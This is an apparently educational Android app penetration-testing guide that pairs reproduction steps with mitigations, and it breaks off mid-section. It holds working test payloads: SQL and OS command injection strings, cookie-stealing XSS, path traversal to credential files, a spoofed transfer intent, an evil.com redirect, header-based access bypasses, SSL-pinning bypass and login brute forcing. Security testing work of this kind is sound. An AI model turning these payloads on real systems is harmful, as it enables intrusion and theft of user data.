# Android Penetration Testing Guide - Beginner Friendly

## Tools Required
- **MobSF** - Mobile Security Framework for static/dynamic analysis
- **ADB** - Android Debug Bridge for device communication
- **Frida/Objection** - Dynamic instrumentation toolkit
- **APKTool** - Tool for reverse engineering APK files
- **JADX or dex2jar+JD-GUI** - Decompilers to view source code
- **Emulator** - Genymotion/Android Studio/Nox Player
- **Burp Suite** - Web proxy for intercepting traffic

---

## 1. MANIFEST FILE CHECKS

### 1.1 DEBUG Flag Set to TRUE

**Issue Description:**  
The application has debugging enabled in production, allowing attackers to attach debuggers and extract sensitive information, manipulate app behavior, or bypass security controls.

**Steps to Reproduce:**
1. Extract the APK using APKTool:
   ```bash
   apktool d application.apk -o output_folder
   ```
2. Navigate to the output folder and open `AndroidManifest.xml`
3. Search for the `<application>` tag
4. Check if `android:debuggable="true"` is present

**Example:**
```xml
<application
    android:debuggable="true"
    android:label="@string/app_name">
```

**Expected Result:**  
`android:debuggable` should be set to `false` or not present in production builds.

**Mitigation:**
- Remove `android:debuggable="true"` from AndroidManifest.xml
- Ensure build configurations disable debugging for release builds
- Use ProGuard/R8 to obfuscate code

---

### 1.2 BACKUP Flag Set to TRUE

**Issue Description:**  
When backup is enabled, application data can be backed up via ADB and restored on another device, potentially exposing sensitive user data.

**Steps to Reproduce:**
1. Decompile APK with APKTool:
   ```bash
   apktool d application.apk
   ```
2. Open `AndroidManifest.xml`
3. Look for `android:allowBackup="true"` in `<application>` tag
4. If true, backup the app data:
   ```bash
   adb backup -f backup.ab -apk com.example.app
   ```
5. Convert backup file and extract:
   ```bash
   dd if=backup.ab bs=24 skip=1 | openssl zlib -d > backup.tar
   tar -xvf backup.tar
   ```

**Example:**
```xml
<application
    android:allowBackup="true"
    android:label="@string/app_name">
```

**Expected Result:**  
Application should not allow backup or implement backup rules to exclude sensitive data.

**Mitigation:**
- Set `android:allowBackup="false"`
- Or use `android:fullBackupContent` to specify backup rules
- Exclude sensitive files from backup

---

### 1.3 Exported Components (Activities, Services, Broadcast Receivers, Content Providers)

**Issue Description:**  
Exported components can be invoked by other applications, potentially leading to unauthorized access, information disclosure, or privilege escalation.

**Steps to Reproduce:**
1. Decompile APK and open AndroidManifest.xml
2. Search for components with `android:exported="true"`:
   ```xml
   <activity android:name=".AdminActivity" android:exported="true"/>
   ```
3. List all exported components using ADB:
   ```bash
   adb shell dumpsys package com.example.app | grep -A 20 "Activity"
   ```
4. Invoke exported activity:
   ```bash
   adb shell am start -n com.example.app/.AdminActivity
   ```

**Expected Result:**  
Only necessary components should be exported with proper permission checks.

**Mitigation:**
- Set `android:exported="false"` for internal components
- Add permission requirements for exported components
- Validate all inputs to exported components

---

### 1.4 Clear Text Traffic Enabled

**Issue Description:**  
Application allows HTTP traffic, making data transmission vulnerable to interception and man-in-the-middle attacks.

**Steps to Reproduce:**
1. Check AndroidManifest.xml for:
   ```xml
   <application android:usesCleartextTraffic="true">
   ```
2. Or check for missing network security configuration
3. Set up Burp Suite proxy on device
4. Attempt to intercept HTTP traffic using Burp Suite

**Expected Result:**  
Application should only use HTTPS for network communication.

**Mitigation:**
- Set `android:usesCleartextTraffic="false"`
- Implement Network Security Configuration
- Use HTTPS for all API calls

---

### 1.5 High Intent Priority

**Issue Description:**  
Setting high priority for intent filters can allow the app to intercept intents meant for other applications.

**Steps to Reproduce:**
1. Open AndroidManifest.xml
2. Look for `android:priority` attribute in intent filters:
   ```xml
   <intent-filter android:priority="999">
   ```
3. Values above 0 indicate elevated priority

**Expected Result:**  
Priority should not be set unless absolutely necessary.

**Mitigation:**
- Remove or reduce intent filter priority
- Only set priority when there's a legitimate use case

---

### 1.6 TaskAffinity Set for Activity

**Issue Description:**  
Custom task affinity can lead to UI-based attacks or information disclosure by manipulating the activity stack.

**Steps to Reproduce:**
1. Open AndroidManifest.xml
2. Search for `android:taskAffinity` attribute:
   ```xml
   <activity android:taskAffinity="com.custom.task">
   ```
3. Check if it's set to a custom value instead of default

**Expected Result:**  
TaskAffinity should only be set when required for specific functionality.

**Mitigation:**
- Remove taskAffinity unless necessary
- Use default task affinity when possible

---

### 1.7 Launch Mode Not Standard

**Issue Description:**  
Non-standard launch modes can be exploited to manipulate activity lifecycle and potentially bypass security controls.

**Steps to Reproduce:**
1. Check AndroidManifest.xml for:
   ```xml
   <activity android:launchMode="singleTask">
   ```
2. Values: standard, singleTop, singleTask, singleInstance

**Expected Result:**  
Use standard launch mode unless there's a specific requirement.

**Mitigation:**
- Use standard launch mode by default
- Document and justify non-standard launch modes

---

## 2. INSECURE DATA STORAGE

### 2.1 Insecure Data in Shared Preferences

**Issue Description:**  
Sensitive data stored in SharedPreferences without encryption can be easily extracted from the device.

**Steps to Reproduce:**
1. Install and run the application
2. Use the app and perform actions that might store data
3. Connect device via ADB:
   ```bash
   adb shell
   ```
4. Navigate to app data:
   ```bash
   cd /data/data/com.example.app/shared_prefs/
   ls
   cat preferences.xml
   ```
5. Or pull the file:
   ```bash
   adb pull /data/data/com.example.app/shared_prefs/preferences.xml
   ```

**Example Finding:**
```xml
<string name="auth_token">eyJhbGciOiJIUzI1NiIs...</string>
<string name="password">MyP@ssw0rd123</string>
```

**Expected Result:**  
No sensitive data should be stored in plain text.

**Mitigation:**
- Use EncryptedSharedPreferences (Android Jetpack Security)
- Encrypt sensitive data before storing
- Use Android Keystore for cryptographic keys

---

### 2.2 Insecure Data in SQLite Database

**Issue Description:**  
Sensitive data stored in unencrypted databases can be accessed by attackers with physical access.

**Steps to Reproduce:**
1. Connect via ADB:
   ```bash
   adb shell
   cd /data/data/com.example.app/databases/
   ls
   ```
2. Pull database file:
   ```bash
   adb pull /data/data/com.example.app/databases/userdata.db
   ```
3. Open with SQLite browser or command line:
   ```bash
   sqlite3 userdata.db
   .tables
   SELECT * FROM users;
   ```

**Expected Result:**  
Sensitive data should be encrypted in the database.

**Mitigation:**
- Use SQLCipher for database encryption
- Encrypt sensitive columns
- Use Android Keystore for key management

---

### 2.3 Insecure Data on SD Card

**Issue Description:**  
Data stored on external storage is accessible to all applications and users with physical access.

**Steps to Reproduce:**
1. Check for external storage usage in code:
   ```bash
   jadx application.apk
   # Search for: getExternalStorageDirectory(), WRITE_EXTERNAL_STORAGE
   ```
2. Browse external storage:
   ```bash
   adb shell
   cd /sdcard/
   find . -name "*appname*"
   ```
3. Pull files:
   ```bash
   adb pull /sdcard/AppData/
   ```

**Expected Result:**  
No sensitive data on external storage.

**Mitigation:**
- Use internal storage for sensitive data
- Encrypt files before storing on external storage
- Use scoped storage (Android 10+)

---

### 2.4 Insecure Data in Temporary Files

**Issue Description:**  
Temporary files containing sensitive data may not be properly deleted and can be recovered.

**Steps to Reproduce:**
1. Navigate to app's cache directory:
   ```bash
   adb shell
   cd /data/data/com.example.app/cache/
   ls -la
   cat tempfile.tmp
   ```
2. Check for sensitive information in temp files

**Expected Result:**  
Temporary files should not contain sensitive data or be securely deleted.

**Mitigation:**
- Avoid storing sensitive data in temp files
- Securely delete temporary files immediately after use
- Use secure deletion methods

---

## 3. CLIENT CODE QUALITY

### 3.1 Hard-coded Credentials

**Issue Description:**  
Credentials hard-coded in the application can be extracted through reverse engineering.

**Steps to Reproduce:**
1. Decompile APK using JADX:
   ```bash
   jadx application.apk -d output_folder
   ```
2. Search for common patterns:
   ```bash
   grep -r "password" output_folder/
   grep -r "api_key" output_folder/
   grep -r "secret" output_folder/
   ```
3. Look in strings.xml and source code for:
   - API keys
   - Passwords
   - Encryption keys
   - Database credentials

**Example Finding:**
```java
String API_KEY = "sk_live_1234567890abcdef";
String password = "admin123";
```

**Expected Result:**  
No credentials should be hard-coded in the application.

**Mitigation:**
- Store credentials securely in backend
- Use OAuth or token-based authentication
- Implement certificate pinning
- Use Android Keystore

---

### 3.2 Insecure Logging

**Issue Description:**  
Sensitive information logged can be accessed via logcat and may be stored in log files.

**Steps to Reproduce:**
1. Install the app and clear logs:
   ```bash
   adb logcat -c
   ```
2. Use the application (login, transactions, etc.)
3. Capture logs:
   ```bash
   adb logcat | grep "com.example.app"
   ```
4. Look for sensitive data in logs

**Example Finding:**
```
D/LoginActivity: User credentials: username=john@email.com, password=Pass123
D/APICall: Token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...
```

**Expected Result:**  
No sensitive information should be logged.

**Mitigation:**
- Remove all Log statements from production code
- Use ProGuard to strip logging
- Implement secure logging wrapper

---

### 3.3 Private IP Disclosure

**Issue Description:**  
Internal IP addresses disclosed in the app can reveal network architecture information.

**Steps to Reproduce:**
1. Decompile with JADX
2. Search for IP patterns:
   ```bash
   grep -rE "192\.168\.|10\.|172\.(1[6-9]|2[0-9]|3[01])\." output_folder/
   ```
3. Check strings.xml and configuration files

**Expected Result:**  
No internal IP addresses should be hard-coded.

**Mitigation:**
- Use domain names instead of IPs
- Store configuration on backend
- Use dynamic configuration

---

### 3.4 Clipboard Not Disabled for Sensitive Fields

**Issue Description:**  
Sensitive data can be copied from input fields and accessed by malicious apps.

**Steps to Reproduce:**
1. Open the app in emulator
2. Enter data in password/sensitive fields
3. Long-press to see if copy option appears
4. Test using ADB:
   ```bash
   adb shell
   service call clipboard 1
   ```

**Expected Result:**  
Copy/paste should be disabled for sensitive fields.

**Mitigation:**
- Set `android:inputType="textPassword"` for password fields
- Disable clipboard programmatically:
```java
editText.setCustomSelectionActionModeCallback(new ActionMode.Callback() {
    public boolean onCreateActionMode(ActionMode mode, Menu menu) {
        return false;
    }
});
```

---

### 3.5 Application Accessible on Rooted Devices

**Issue Description:**  
App runs on rooted devices where security controls can be bypassed.

**Steps to Reproduce:**
1. Root an emulator or test device
2. Install and run the application
3. Check if app has root detection
4. Use Magisk Hide to bypass detection

**Expected Result:**  
App should detect root and either warn user or refuse to run.

**Mitigation:**
- Implement root detection
- Check for su binary
- Verify SafetyNet attestation
- Use server-side validation

---

### 3.6 Insecure Deep Links

**Issue Description:**  
Deep links without proper validation can be exploited for phishing or unauthorized access.

**Steps to Reproduce:**
1. Check AndroidManifest.xml for deep link schemes:
   ```xml
   <intent-filter>
       <data android:scheme="myapp" android:host="reset"/>
   </intent-filter>
   ```
2. Test deep link:
   ```bash
   adb shell am start -a android.intent.action.VIEW -d "myapp://reset?token=123"
   ```
3. Try malicious parameters

**Expected Result:**  
Deep links should validate all parameters.

**Mitigation:**
- Validate all deep link parameters
- Use App Links for verification
- Implement proper authentication

---

### 3.7 Redundant Permissions

**Issue Description:**  
Unnecessary permissions increase attack surface and privacy concerns.

**Steps to Reproduce:**
1. Check AndroidManifest.xml for permissions:
   ```xml
   <uses-permission android:name="android.permission.CAMERA"/>
   <uses-permission android:name="android.permission.READ_CONTACTS"/>
   ```
2. Test if app functionality works without certain permissions
3. Use MobSF to analyze permission usage

**Expected Result:**  
Only necessary permissions should be requested.

**Mitigation:**
- Request minimum required permissions
- Document why each permission is needed
- Use runtime permissions (Android 6+)

---

## 4. CRYPTOGRAPHIC FAILURES

### 4.1 Bypass SSL/Certificate Pinning

**Issue Description:**  
Lack of certificate pinning allows man-in-the-middle attacks using proxy tools.

**Steps to Reproduce:**
1. Install Burp Suite CA certificate on device
2. Configure device to use Burp as proxy
3. Start the application
4. Check if you can intercept HTTPS traffic in Burp
5. If pinning exists, bypass using Frida:
   ```bash
   frida -U -f com.example.app -l ssl-pinning-bypass.js
   ```

**Expected Result:**  
Certificate pinning should prevent proxy interception.

**Mitigation:**
- Implement certificate pinning
- Use Network Security Configuration
- Validate certificate chain
- Monitor for bypass attempts

---

### 4.2 Missing SSL/TLS Encryption

**Issue Description:**  
Sensitive data transmitted over unencrypted HTTP connections.

**Steps to Reproduce:**
1. Set up Burp Suite proxy
2. Configure device proxy settings
3. Use the application
4. Monitor HTTP history in Burp Suite
5. Look for unencrypted API calls

**Example Finding:**
```
POST http://api.example.com/login
username=user&password=Pass123
```

**Expected Result:**  
All network traffic should use HTTPS.

**Mitigation:**
- Use HTTPS for all communications
- Disable cleartext traffic
- Implement certificate pinning

---

### 4.3 Weak Signing/Certificate

**Issue Description:**  
Weak signing algorithms or insecure certificates compromise app integrity.

**Steps to Reproduce:**
1. Extract certificate from APK:
   ```bash
   unzip application.apk META-INF/CERT.RSA
   keytool -printcert -file META-INF/CERT.RSA
   ```
2. Check signature algorithm
3. Verify certificate validity period
4. Use MobSF for automated analysis

**Expected Result:**  
Strong signing algorithm (SHA256 with RSA) should be used.

**Mitigation:**
- Use SHA-256 or stronger
- Ensure certificate validity
- Use proper keystore management

---

## 5. REVERSE ENGINEERING

### 5.1 Application Decompilation

**Issue Description:**  
Application can be easily decompiled to view source code and logic.

**Steps to Reproduce:**
1. Decompile using JADX:
   ```bash
   jadx application.apk -d output_folder
   ```
2. Or convert to JAR and use JD-GUI:
   ```bash
   dex2jar application.apk
   jd-gui application-dex2jar.jar
   ```
3. Browse source code and identify sensitive logic

**Expected Result:**  
Source code should be obfuscated.

**Mitigation:**
- Use ProGuard/R8 for obfuscation
- Implement anti-tampering checks
- Use native code for sensitive operations

---

### 5.2 Lack of Obfuscation

**Issue Description:**  
Readable class and method names make reverse engineering easier.

**Steps to Reproduce:**
1. Decompile APK
2. Check if class names are readable:
   ```java
   com.example.app.LoginActivity
   com.example.app.utils.EncryptionHelper
   ```
3. Look for meaningful variable names

**Expected Result:**  
Code should be obfuscated with meaningless names.

**Mitigation:**
- Enable ProGuard/R8 in build.gradle
- Configure obfuscation rules properly
- Test thoroughly after obfuscation

---

### 5.3 Application Contains Obsolete Files

**Issue Description:**  
Backup files, debug files, or commented code may contain sensitive information.

**Steps to Reproduce:**
1. Extract APK:
   ```bash
   unzip application.apk -d extracted/
   ```
2. Look for suspicious files:
   ```bash
   find extracted/ -name "*.bak"
   find extracted/ -name "*.old"
   find extracted/ -name "*.tmp"
   ```
3. Check for debug or test files

**Expected Result:**  
No obsolete or backup files should be present.

**Mitigation:**
- Clean build directory before release
- Use proper .gitignore
- Automate build process

---

### 5.4 Unauthorized Code Modification & Recompilation

**Issue Description:**  
Application can be modified and re-signed to inject malicious code.

**Steps to Reproduce:**
1. Decompile APK:
   ```bash
   apktool d application.apk
   ```
2. Modify code (e.g., bypass authentication)
3. Recompile:
   ```bash
   apktool b application -o modified.apk
   ```
4. Sign the APK:
   ```bash
   jarsigner -keystore debug.keystore modified.apk androiddebugkey
   ```
5. Install and test:
   ```bash
   adb install modified.apk
   ```

**Expected Result:**  
App should detect tampering and refuse to run.

**Mitigation:**
- Implement integrity checks
- Verify signature at runtime
- Use Google Play App Signing
- Implement root detection

---

## 6. COMPONENT EXPLOITATION

### 6.1 Invoking Exported Activities

**Issue Description:**  
Exported activities can be launched by external apps without proper authorization.

**Steps to Reproduce:**
1. Find exported activities in Manifest
2. Invoke using ADB:
   ```bash
   adb shell am start -n com.example.app/.AdminPanelActivity
   ```
3. Pass extra data:
   ```bash
   adb shell am start -n com.example.app/.UserProfile -e user_id "123"
   ```

**Expected Result:**  
Access should be denied without proper authentication.

**Mitigation:**
- Set exported="false" for internal activities
- Implement permission checks
- Validate all intent data

---

### 6.2 Invoking Exported Services

**Issue Description:**  
Exported services can be started or bound by malicious applications.

**Steps to Reproduce:**
1. Identify exported services in Manifest
2. Start service:
   ```bash
   adb shell am startservice -n com.example.app/.DataSyncService
   ```
3. Test with parameters:
   ```bash
   adb shell am startservice -n com.example.app/.DataSyncService --es "action" "delete_all"
   ```

**Expected Result:**  
Service should validate caller permissions.

**Mitigation:**
- Use exported="false"
- Implement custom permissions
- Validate all inputs

---

### 6.3 Invoking Exported Broadcast Receivers

**Issue Description:**  
Exported receivers can receive intents from any application.

**Steps to Reproduce:**
1. Find receivers in Manifest
2. Send broadcast:
   ```bash
   adb shell am broadcast -a com.example.app.ACTION_LOGOUT
   ```
3. Send with data:
   ```bash
   adb shell am broadcast -a com.example.app.ACTION_UPDATE --es "data" "malicious"
   ```

**Expected Result:**  
Receiver should verify sender and validate data.

**Mitigation:**
- Use local broadcast receivers
- Implement signature-level permissions
- Validate all received data

---

### 6.4 Exploiting Content Providers

**Issue Description:**  
Exported content providers may expose sensitive data or allow unauthorized modifications.

**Steps to Reproduce:**
1. List content providers:
   ```bash
   adb shell dumpsys package com.example.app | grep -A 20 "Provider"
   ```
2. Query provider:
   ```bash
   adb shell content query --uri content://com.example.app.provider/users
   ```
3. Insert data:
   ```bash
   adb shell content insert --uri content://com.example.app.provider/users --bind name:s:hacker
   ```
4. Try SQL injection:
   ```bash
   adb shell content query --uri "content://com.example.app.provider/users" --where "id='1' OR '1'='1'"
   ```

**Expected Result:**  
Provider should enforce proper access controls.

**Mitigation:**
- Set exported="false"
- Implement permission checks
- Validate and sanitize all queries

---

### 6.5 Content Provider Path Traversal

**Issue Description:**  
Improper path validation in content providers allows accessing arbitrary files.

**Steps to Reproduce:**
1. Identify content provider URIs
2. Test path traversal:
   ```bash
   adb shell content query --uri "content://com.example.app.provider/../../../data/data/com.example.app/shared_prefs/credentials.xml"
   ```
3. Try to read sensitive files

**Expected Result:**  
Path traversal should be prevented.

**Mitigation:**
- Validate all file paths
- Use canonical paths
- Restrict accessible directories

---

### 6.6 Intent Spoofing

**Issue Description:**  
Application trusts intent data without validation, allowing data injection.

**Steps to Reproduce:**
1. Find activities receiving intents
2. Craft malicious intent:
   ```bash
   adb shell am start -n com.example.app/.TransferActivity --es "amount" "0.01" --es "account" "attacker_account"
   ```
3. Test with various payloads

**Expected Result:**  
All intent data should be validated.

**Mitigation:**
- Validate all intent extras
- Use explicit intents internally
- Implement type checking

---

### 6.7 Data Extraction Using DEBUG

**Issue Description:**  
Debug mode allows extracting application data without root.

**Steps to Reproduce:**
1. Check if app is debuggable
2. Backup app data:
   ```bash
   adb backup -f backup.ab -apk com.example.app
   ```
3. Extract backup:
   ```bash
   dd if=backup.ab bs=24 skip=1 | openssl zlib -d > backup.tar
   tar -xvf backup.tar
   ```
4. Browse extracted data

**Expected Result:**  
Debug should be disabled in production.

**Mitigation:**
- Set debuggable="false"
- Disable backup or use backup rules
- Encrypt sensitive data

---

### 6.8 Directory Browsing

**Issue Description:**  
Application directory structure and files can be browsed.

**Steps to Reproduce:**
1. Connect via ADB:
   ```bash
   adb shell
   cd /data/data/com.example.app/
   ls -laR
   ```
2. Browse all subdirectories:
   ```bash
   find /data/data/com.example.app/
   ```

**Expected Result:**  
Requires root or debuggable app, proper permissions should prevent access.

**Mitigation:**
- Set proper file permissions
- Disable debugging
- Encrypt sensitive files

---

## 7. WEBVIEW EXPLOITATION

### 7.1 JavaScript Enabled in WebView

**Issue Description:**  
JavaScript enabled without proper validation can lead to XSS attacks.

**Steps to Reproduce:**
1. Decompile and find WebView code:
   ```java
   webView.getSettings().setJavaScriptEnabled(true);
   ```
2. Load malicious URL in WebView
3. Inject JavaScript:
   ```javascript
   <script>alert(document.cookie)</script>
   ```

**Expected Result:**  
JavaScript should be disabled unless absolutely necessary.

**Mitigation:**
- Disable JavaScript if not needed
- Validate all URLs loaded
- Implement Content Security Policy

---

### 7.2 AllowFileAccess Enabled

**Issue Description:**  
File access in WebView can expose local files to JavaScript.

**Steps to Reproduce:**
1. Find in code:
   ```java
   webView.getSettings().setAllowFileAccess(true);
   ```
2. Test file access:
   ```javascript
   window.location = "file:///data/data/com.example.app/shared_prefs/credentials.xml"
   ```

**Expected Result:**  
File access should be disabled.

**Mitigation:**
- Set setAllowFileAccess(false)
- Validate content sources
- Use content:// URIs

---

### 7.3 AllowContentAccess Enabled

**Issue Description:**  
Content access allows accessing content providers from WebView.

**Steps to Reproduce:**
1. Check for:
   ```java
   webView.getSettings().setAllowContentAccess(true);
   ```
2. Access content providers from JavaScript

**Expected Result:**  
Should be disabled unless specifically needed.

**Mitigation:**
- Disable content access
- Validate URLs
- Use whitelist

---

### 7.4 Universal Access From File URLs

**Issue Description:**  
Allows file:// URLs to access other file:// URLs, leading to local file disclosure.

**Steps to Reproduce:**
1. Find in code:
   ```java
   webView.getSettings().setAllowUniversalAccessFromFileURLs(true);
   ```
2. Load local HTML with JavaScript
3. Access other local files

**Expected Result:**  
Should be set to false.

**Mitigation:**
- Set setAllowUniversalAccessFromFileURLs(false)
- Avoid loading file:// URLs
- Use assets or res folders

---

### 7.5 WebView Open Redirection

**Issue Description:**  
WebView loads URLs from untrusted sources without validation.

**Steps to Reproduce:**
1. Find WebView loading external URLs
2. Intercept and modify URL parameter:
   ```bash
   adb shell am start -n com.example.app/.WebViewActivity --es "url" "http://evil.com"
   ```
3. Check if malicious URL is loaded

**Expected Result:**  
URLs should be validated against whitelist.

**Mitigation:**
- Implement URL whitelist
- Validate all URLs before loading
- Use shouldOverrideUrlLoading

---

## 8. INJECTION ATTACKS

### 8.1 SQL Injection (Error-based)

**Issue Description:**  
Application vulnerable to SQL injection through unvalidated user input.

**Steps to Reproduce:**
1. Identify input fields (login, search, etc.)
2. Intercept request in Burp Suite
3. Test with SQL payloads:
   ```
   username=' OR '1'='1
   username=admin'--
   username=' UNION SELECT null,null--
   ```
4. Check for SQL errors in response

**Expected Result:**  
Input should be sanitized, no SQL errors should be visible.

**Mitigation:**
- Use parameterized queries
- Implement input validation
- Use ORM frameworks
- Escape special characters

---

### 8.2 SQL Injection (Boolean-based Blind)

**Issue Description:**  
Application behavior changes based on true/false SQL conditions.

**Steps to Reproduce:**
1. Find vulnerable parameter
2. Test Boolean conditions:
   ```
   id=1 AND 1=1 (returns normal)
   id=1 AND 1=2 (returns different)
   ```
3. Extract data bit by bit:
   ```
   id=1 AND substring(password,1,1)='a'
   ```

**Expected Result:**  
No behavioral differences based on SQL conditions.

**Mitigation:**
- Use prepared statements
- Implement input validation
- Return generic error messages

---

### 8.3 SQL Injection (Time-based Blind)

**Issue Description:**  
SQL injection exploiting time delays to extract data.

**Steps to Reproduce:**
1. Test time-based payloads:
   ```
   id=1'; WAITFOR DELAY '00:00:05'--
   id=1' AND SLEEP(5)--
   ```
2. Observe response time
3. Extract data:
   ```
   id=1' AND IF(substring(password,1,1)='a',SLEEP(5),0)--
   ```

**Expected Result:**  
No time delays should occur based on input.

**Mitigation:**
- Use prepared statements
- Implement timeout limits
- Monitor for abnormal delays

---

### 8.4 OS Command Injection

**Issue Description:**  
Application executes system commands with user input.

**Steps to Reproduce:**
1. Find input fields processed by system commands
2. Test command injection:
   ```
   filename=test.txt; ls -la
   filename=test.txt && cat /etc/passwd
   filename=test.txt | whoami
   ```
3. Intercept and modify in Burp Suite

**Expected Result:**  
No OS commands should execute from user input.

**Mitigation:**
- Avoid executing system commands
- Use APIs instead of shell commands
- Validate and sanitize all inputs
- Use whitelist of allowed characters

---

### 8.5 HTML Injection

**Issue Description:**  
User input reflected in WebView without sanitization.

**Steps to Reproduce:**
1. Find input reflected in WebView
2. Test HTML injection:
   ```html
   <h1>Injected Header</h1>
   <img src=x onerror=alert('XSS')>
   ```
3. Observe if HTML is rendered

**Expected Result:**  
HTML should be escaped and not rendered.

**Mitigation:**
- Sanitize all user input
- Use HTML encoding
- Implement Content Security Policy
- Disable JavaScript if possible

---

## 9. CROSS-SITE SCRIPTING (XSS)

### 9.1 Reflected XSS

**Issue Description:**  
User input reflected in response without sanitization, allowing script execution.

**Steps to Reproduce:**
1. Identify input fields displayed in WebView
2. Intercept request in Burp Suite
3. Test XSS payloads:
   ```javascript
   <script>alert('XSS')</script>
   <img src=x onerror=alert('XSS')>
   <svg/onload=alert('XSS')>
   ```
4. Check if script executes in WebView

**Expected Result:**  
Scripts should not execute, input should be sanitized.

**Mitigation:**
- Encode output properly
- Use Content Security Policy
- Disable JavaScript in WebView if not needed
- Implement input validation

---

### 9.2 Stored XSS

**Issue Description:**  
Malicious scripts stored in database and executed when retrieved.

**Steps to Reproduce:**
1. Find input stored in backend (comments, profile, etc.)
2. Submit XSS payload:
   ```javascript
   <script>alert(document.cookie)</script>
   ```
3. Navigate to page displaying stored data
4. Check if script executes
5. Use Burp Suite to intercept and modify requests

**Expected Result:**  
Stored content should be sanitized before display.

**Mitigation:**
- Sanitize input before storage
- Encode output when displaying
- Use Content Security Policy
- Implement input validation on both client and server

---

## 10. BROKEN ACCESS CONTROL

### 10.1 Insecure Direct Object Reference (IDOR)

**Issue Description:**  
Application exposes direct references to internal objects without authorization checks.

**Steps to Reproduce:**
1. Log in as User A
2. Access profile: `GET /api/user/profile?id=123`
3. Intercept in Burp Suite
4. Change ID parameter: `?id=124` (User B's ID)
5. Check if you can access other user's data
6. Test with various endpoints:
   ```
   /api/orders?order_id=1001
   /api/documents?doc_id=5678
   ```

**Expected Result:**  
Access should be denied for unauthorized resources.

**Mitigation:**
- Implement proper authorization checks
- Use indirect references (UUIDs)
- Validate user ownership server-side
- Use access control lists (ACLs)

---

### 10.2 Horizontal Privilege Escalation

**Issue Description:**  
User can access resources belonging to other users at the same privilege level.

**Steps to Reproduce:**
1. Create two accounts: User A and User B
2. Log in as User A
3. Perform action (view profile, orders, etc.)
4. Intercept request in Burp Suite
5. Note User A's ID in parameters
6. Log in as User B
7. Replay User A's request with User B's token
8. Example:
   ```
   GET /api/messages?user_id=UserA
   Header: Authorization: Bearer UserB_Token
   ```

**Expected Result:**  
Request should be denied or return only User B's data.

**Mitigation:**
- Validate user context on server-side
- Never trust client-side IDs
- Implement proper session management
- Use server-side authorization checks

---

### 10.3 Vertical Privilege Escalation

**Issue Description:**  
Regular user can access administrative functions.

**Steps to Reproduce:**
1. Log in as regular user
2. Identify admin endpoints:
   ```
   /api/admin/users
   /api/admin/delete_user
   /admin_panel
   ```
3. Try accessing with regular user token
4. Test by changing role parameter:
   ```
   POST /api/update_profile
   {"role": "admin"}
   ```
5. Intercept and test in Burp Suite

**Expected Result:**  
Admin functions should be inaccessible to regular users.

**Mitigation:**
- Implement role-based access control (RBAC)
- Validate permissions server-side
- Never trust client-side role information
- Use separate authentication for admin functions

---

### 10.4 Bypassing Authorization by Removing Token

**Issue Description:**  
Removing authentication token still allows access to protected resources.

**Steps to Reproduce:**
1. Access protected endpoint with token:
   ```
   GET /api/user/profile
   Authorization: Bearer token123
   ```
2. Intercept request in Burp Suite
3. Remove Authorization header completely
4. Forward request
5. Check if access is still granted

**Expected Result:**  
Request should be denied without valid token.

**Mitigation:**
- Always validate token presence
- Return 401 Unauthorized for missing tokens
- Implement proper authentication middleware
- Never rely on optional authentication

---

### 10.5 Unprotected Admin Functionality

**Issue Description:**  
Administrative functions accessible without authentication.

**Steps to Reproduce:**
1. Decompile APK and search for admin URLs:
   ```bash
   grep -r "admin" output_folder/
   ```
2. Test direct access:
   ```bash
   adb shell am start -n com.example.app/.AdminPanelActivity
   ```
3. Try admin URLs without authentication:
   ```
   /admin
   /administrator
   /admin_panel
   ```

**Expected Result:**  
Admin functions require proper authentication and authorization.

**Mitigation:**
- Implement authentication for all admin functions
- Use role-based access control
- Hide admin functionality from regular users
- Monitor access to admin endpoints

---

### 10.6 Parameter-based Access Control

**Issue Description:**  
Access control based on client-side parameters that can be manipulated.

**Steps to Reproduce:**
1. Log in and capture requests in Burp Suite
2. Look for role/permission parameters:
   ```json
   {
     "user_id": "123",
     "role": "user"
   }
   ```
3. Modify to elevated role:
   ```json
   {
     "user_id": "123",
     "role": "admin"
   }
   ```
4. Test access to restricted features

**Expected Result:**  
Server should determine roles, not client parameters.

**Mitigation:**
- Store roles server-side
- Never trust client-provided role information
- Validate permissions on every request
- Use secure session management

---

### 10.7 Platform Misconfiguration Access Control

**Issue Description:**  
Additional HTTP headers can bypass access controls.

**Steps to Reproduce:**
1. Access restricted resource and get 403 Forbidden
2. Intercept in Burp Suite
3. Add headers:
   ```
   X-Forwarded-For: 127.0.0.1
   X-Original-URL: /admin
   X-Rewrite-URL: /admin
   X-Custom-IP-Authorization: 127.0.0.1
   ```
4. Test various combinations

**Expected Result:**  
Headers should not bypass access controls.

**Mitigation:**
- Validate X-Forwarded headers
- Implement proper access control logic
- Don't rely on IP-based restrictions for mobile apps
- Validate all headers server-side

---

## 11. BROKEN AUTHENTICATION

### 11.1 Login Brute Force

**Issue Description:**  
No rate limiting on login attempts allows password guessing attacks.

**Steps to Reproduce:**
1. Capture login request in Burp Suite
2. Send to Burp Intruder
3. Set username as constant, password as variable
4. Load password wordlist
5. Start attack and monitor responses
6. Example request:
   ```
   POST /api/login
   {"username":"admin","password":"§password§"}
   ```

**Expected Result:**  
Account should lock or implement delays after failed attempts.

**Mitigation:**
- Implement account lockout mechanism
- Add CAPTCHA after failed attempts
- Use rate limiting
- Monitor for brute force patterns
- Implement exponential backoff

---

### 11.2 Bypassing CAPTCHA

**Issue Description:**  
CAPTCHA can be bypassed or is not properly validated.

**Steps to Reproduce:**
1. Intercept login request with CAPTCHA
2. Try removing CAPTCHA parameter:
   ```json
   {"username":"user","password":"pass"}
   ```
3. Try with empty CAPTCHA:
   ```json
   {"username":"user","password":"pass","captcha":""}
   ```
4. Replay old CAPTCHA tokens
5. Test with Burp Suite Intruder

**Expected Result:**  
CAPTCHA should be mandatory and validated server-side.

**Mitigation:**
- Validate CAPTCHA server-side
- Use one-time tokens
- Implement proper CAPTCHA libraries
- Track CAPTCHA usage

---

### 11.3 User Enumeration

**Issue Description:**  
Different responses reveal whether username exists in system.

**Steps to Reproduce:**
1. Test with non-existent username:
   ```
   POST /api/login
   {"username":"nonexistent","password":"test"}
   Response: "Username not found"
   ```
2. Test with existing username:
   ```
   POST /api/login
   {"username":"admin","password":"test"}
   Response: "Invalid password"
   ```
3. Compare response times, messages, status codes

**Expected Result:**  
Generic error message for all failed login attempts.

**Mitigation:**
- Use same error message for all failures
- Ensure response times are consistent
- Return same status codes
- Implement CAPTCHA

---

### 11.4 Weak Password Policy

**Issue Description:**  
Application accepts weak passwords that are easy to guess.

**Steps to Reproduce:**
1. Create account with weak passwords:
   ```
   password: 123456
   password: password
   password: abc
   ```
